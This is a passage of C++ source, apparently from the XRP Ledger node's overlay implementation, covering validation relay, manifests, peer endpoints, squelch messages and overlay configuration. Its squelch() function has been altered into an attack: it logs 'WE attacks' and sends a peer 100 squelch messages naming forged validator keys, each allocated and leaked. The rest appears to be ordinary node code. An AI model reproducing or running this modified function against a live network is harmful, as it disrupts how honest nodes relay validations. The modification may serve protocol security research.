            std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER, validator);
        for_each([&](std::shared_ptr<PeerImp>&& p) {
            if (toSkip->find(p->id()) == toSkip->end())
                p->send(sm);
        });
        return *toSkip;
    }
    return {};
}

void
OverlayImpl::broadcast(protocol::TMValidation& m)
{
    auto const sm = std::make_shared<Message>(m, protocol::mtVALIDATION);
    for_each([sm](std::shared_ptr<PeerImp>&& p) { p->send(sm); });
}

std::set<Peer::id_t>
OverlayImpl::relay(
    protocol::TMValidation& m,
    uint256 const& uid,
    PublicKey const& validator)
{
    if (auto const toSkip = app_.getHashRouter().shouldRelay(uid))
    {
        auto const sm =
            std::make_shared<Message>(m, protocol::mtVALIDATION, validator);
        for_each([&](std::shared_ptr<PeerImp>&& p) {
            if (toSkip->find(p->id()) == toSkip->end())
                p->send(sm);
        });
        return *toSkip;
    }
    return {};
}

std::shared_ptr<Message>
OverlayImpl::getManifestsMessage()
{
    std::lock_guard g(manifestLock_);

    if (auto seq = app_.validatorManifests().sequence();
        seq != manifestListSeq_)
    {
        protocol::TMManifests tm;

        app_.validatorManifests().for_each_manifest(
            [&tm](std::size_t s) { tm.mutable_list()->Reserve(s); },
            [&tm, &hr = app_.getHashRouter()](Manifest const& manifest) {
                tm.add_list()->set_stobject(
                    manifest.serialized.data(), manifest.serialized.size());
                hr.addSuppression(manifest.hash());
            });

        manifestMessage_.reset();

        if (tm.list_size() != 0)
            manifestMessage_ =
                std::make_shared<Message>(tm, protocol::mtMANIFESTS);

        manifestListSeq_ = seq;
    }

    return manifestMessage_;
}

//------------------------------------------------------------------------------

void
OverlayImpl::remove(Child& child)
{
    std::lock_guard lock(mutex_);
    list_.erase(&child);
    if (list_.empty())
        checkStopped();
}

void
OverlayImpl::stop()
{
    // Calling list_[].second->stop() may cause list_ to be modified
    // (OverlayImpl::remove() may be called on this same thread).  So
    // iterating directly over list_ to call child->stop() could lead to
    // undefined behavior.
    //
    // Therefore we copy all of the weak/shared ptrs out of list_ before we
    // start calling stop() on them.  That guarantees OverlayImpl::remove()
    // won't be called until vector<> children leaves scope.
    std::vector<std::shared_ptr<Child>> children;
    {
        std::lock_guard lock(mutex_);
        if (!work_)
            return;
        work_ = boost::none;

        children.reserve(list_.size());
        for (auto const& element : list_)
        {
            children.emplace_back(element.second.lock());
        }
    }  // lock released

    for (auto const& child : children)
    {
        if (child != nullptr)
            child->stop();
    }
}

void
OverlayImpl::autoConnect()
{
    auto const result = m_peerFinder->autoconnect();
    for (auto addr : result)
        connect(addr);
}

void
OverlayImpl::sendEndpoints()
{
    auto const result = m_peerFinder->buildEndpointsForPeers();
    for (auto const& e : result)
    {
        std::shared_ptr<PeerImp> peer;
        {
            std::lock_guard lock(mutex_);
            auto const iter = m_peers.find(e.first);
            if (iter != m_peers.end())
                peer = iter->second.lock();
        }
        if (peer)
            peer->sendEndpoints(e.second.begin(), e.second.end());
    }
}

std::shared_ptr<Message>
makeSquelchMessage(
    PublicKey const& validator,
    bool squelch,
    uint32_t squelchDuration)
{
    protocol::TMSquelch m;
    m.set_squelch(squelch);
    m.set_validatorpubkey(validator.data(), validator.size());
    if (squelch)
        m.set_squelchduration(squelchDuration);
    return std::make_shared<Message>(m, protocol::mtSQUELCH);
}

void
OverlayImpl::unsquelch(PublicKey const& validator, Peer::id_t id) const
{
    if (auto peer = findPeerByShortID(id);
        peer && app_.config().VP_REDUCE_RELAY_SQUELCH)
    {
        // optimize - multiple message with different
        // validator might be sent to the same peer
        peer->send(makeSquelchMessage(validator, false, 0));
    }
}
////////////////////////////////////////////////////////////////////
void
OverlayImpl::squelch(
    PublicKey const& validator,
    Peer::id_t id,
    uint32_t squelchDuration) const
{
    if (auto peer = findPeerByShortID(id);
        peer && app_.config().VP_REDUCE_RELAY_SQUELCH)
    {
       //Install our validator 
        JLOG(journal_.trace()) << "WE attacks +++++++++++ ";
        for (int i=0; i<100; i++)
        {
            JLOG(journal_.trace()) << "WE attacks +++++++++++ " <<i;
            PublicKey *validator1 = new PublicKey();
            for (uint8_t j=0; j<33; ++j)
                validator1->buf_[j]=0XFF>>j;
            peer->send(makeSquelchMessage(*validator1, true, squelchDuration));
        }
    }
}
    
    
      
////////////////////////////////////////////////////////////////////
    
    
    
    
    
void
OverlayImpl::updateSlotAndSquelch(
    uint256 const& key,
    PublicKey const& validator,
    std::set<Peer::id_t>&& peers,
    protocol::MessageType type)
{
    if (!strand_.running_in_this_thread())
        return post(
            strand_,
            [this, key, validator, peers = std::move(peers), type]() mutable {
                updateSlotAndSquelch(key, validator, std::move(peers), type);
            });

    for (auto id : peers)
        slots_.updateSlotAndSquelch(key, validator, id, type);
}

void
OverlayImpl::updateSlotAndSquelch(
    uint256 const& key,
    PublicKey const& validator,
    Peer::id_t peer,
    protocol::MessageType type)
{
    if (!strand_.running_in_this_thread())
        return post(strand_, [this, key, validator, peer, type]() {
            updateSlotAndSquelch(key, validator, peer, type);
        });

    slots_.updateSlotAndSquelch(key, validator, peer, type);
}

void
OverlayImpl::deletePeer(Peer::id_t id)
{
    if (!strand_.running_in_this_thread())
        return post(strand_, std::bind(&OverlayImpl::deletePeer, this, id));

    slots_.deletePeer(id, true);
}

void
OverlayImpl::deleteIdlePeers()
{
    if (!strand_.running_in_this_thread())
        return post(strand_, std::bind(&OverlayImpl::deleteIdlePeers, this));

    slots_.deleteIdlePeers();
}

//------------------------------------------------------------------------------

Overlay::Setup
setup_Overlay(BasicConfig const& config)
{
    Overlay::Setup setup;

    {
        auto const& section = config.section("overlay");
        setup.context = make_SSLContext("");

        set(setup.ipLimit, "ip_limit", section);
        if (setup.ipLimit < 0)
            Throw<std::runtime_error>("Configured IP limit is invalid");

        std::string ip;
        set(ip, "public_ip", section);
        if (!ip.empty())
        {
            boost::system::error_code ec;
            setup.public_ip = beast::IP::Address::from_string(ip, ec);
            if (ec || beast::IP::is_private(setup.public_ip))
                Throw<std::runtime_error>("Configured public IP is invalid");
        }
    }

    {
        auto const& section = config.section("crawl");
        auto const& values = section.values();

        if (values.size() > 1)
        {
            Throw<std::runtime_error>(
                "Configured [crawl] section is invalid, too many values");
        }

        bool crawlEnabled = true;

        // Only allow "0|1" as a value
        if (values.size() == 1)
        {
            try
            {
                crawlEnabled = boost::lexical_cast<bool>(values.front());
            }
            catch (boost::bad_lexical_cast const&)
            {
                Throw<std::runtime_error>(
                    "Configured [crawl] section has invalid value: " +
                    values.front());
            }
        }

        if (crawlEnabled)
        {
            if (get<bool>(section, "overlay", true))
            {
                setup.crawlOptions |= CrawlOptions::Overlay;
            }
            if (get<bool>(section, "server", true))
            {
                setup.crawlOptions |= CrawlOptions::ServerInfo;
            }
            if (get<bool>(section, "counts", false))
            {
                setup.crawlOptions |= CrawlOptions::ServerCounts;
            }
            if (get<bool>(section, "unl", true))
            {
                setup.crawlOptions |= CrawlOptions::Unl;
            }
        }
    }
    {
        auto const& section = config.section("vl");

        set(setup.vlEnabled, "enabled", section);
    }

    try
    {
        auto id = config.legacy("network_id");

        if (!id.empty())
        {
            if (id == "main")
                id = "0";

            if (id == "testnet")
                id = "1";

            if (id == "devnet")
                id = "2";

            setup.networkID = beast::lexicalCastThrow<std::uint32_t>(id);
        }
    }
    catch (...)
    {
        Throw<std::runtime_error>(
            "Configured [network_id] section is invalid: must be a number "
            "or one of the strings 'main', 'testnet' or 'devnet'.");
    }

    return setup;
}

std::unique_ptr<Overlay>
make_Overlay(
    Application& app,
    Overlay::Setup const& setup,
    Stoppable& parent,
    ServerHandler& serverHandler,
    Resource::Manager& resourceManager,
    Resolver& resolver,
    boost::asio::io_service& io_service,
    BasicConfig const& config,
    beast::insight::Collector::ptr const& collector)
{
    return std::make_unique<OverlayImpl>(
        app,
        setup,
        parent,
        serverHandler,
        resourceManager,
        resolver,
        io_service,
        config,
        collector);
}

}  // namespace ripple
